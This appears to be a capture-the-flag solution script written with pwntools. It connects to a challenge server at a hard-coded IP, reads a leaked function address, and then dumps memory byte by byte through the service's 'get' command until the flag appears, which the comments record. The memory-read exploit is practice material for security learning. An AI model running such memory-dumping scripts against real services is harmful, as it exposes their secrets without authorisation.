from pwn import *

import sys;
import numpy;
import io;

pwnlib.context.log_level = 'debug'

r = remote('54.89.22.85', 10005)

# Receive the address of the printFlag fn
r.recvuntil('The address of printFlag ', drop=True)
addr = int(r.recvuntil('\n'))
print addr

r.recvuntil('>> ', drop=True)

# Continue reading the entire memory, waiting to find the flag string...
while(True):
  addr += 1
  r.send('get ')
  r.sendline(str(addr))
  out = r.recvline()
  val_hex = out[len(str(addr))+5:-1]
  val_int = int(val_hex, 0)
  val_chr = chr(val_int)
  print "0x%02x %s"%(val_int,val_chr)
  r.recvuntil('>> ', drop=True)

r.stream()

# Which after a long time reveals:

# 0x74 t
# 0x68 h
# 0x65 e
# 0x20  
# 0x66 f
# 0x6c l
# 0x61 a
# 0x67 g
# 0x20  
# 0x69 i
# 0x73 s
# 0x20  
# 0x79 y
# 0x37 7
# 0x63 c
# 0x74 t
# 0x66 f
# 0x7b {
# 0x6d m
# 0x33 3
# 0x6d m
# 0x76 v
# 0x69 i
# 0x65 e
# 0x77 w
# 0x3d =
# 0x74 t
# 0x6f o
# 0x74 t
# 0x40 @
# 0x6c l
# 0x50 P
# 0x77 w
# 0x6e n
# 0x7d }
# 0x00 \x00

# y7ctf{m3mview=tot@lPwn}
